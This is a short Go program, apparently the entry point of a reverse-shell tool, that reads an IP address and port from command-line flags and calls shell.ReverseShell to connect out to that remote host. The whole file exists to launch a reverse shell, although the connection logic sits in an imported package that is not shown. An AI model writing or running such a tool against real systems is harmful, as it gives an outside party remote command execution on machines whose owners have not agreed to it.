package main

import (
	"flag"

	"github.com/mdnix/reverse-shell/shell"
	log "github.com/sirupsen/logrus"
)

var (
	ip   string
	port string
)

func init() {
	flag.StringVar(&ip, "ip", "", "Defined the ip address of the remote machine")
	flag.StringVar(&port, "port", "", "Defines on which port the remote machine is listening")
	flag.Parse()

}

func main() {
	if len(ip) > 0 && len(port) > 0 {
		shell.ReverseShell(ip, port)
	} else {
		log.Print("IP address and port can't be empty")
	}
}
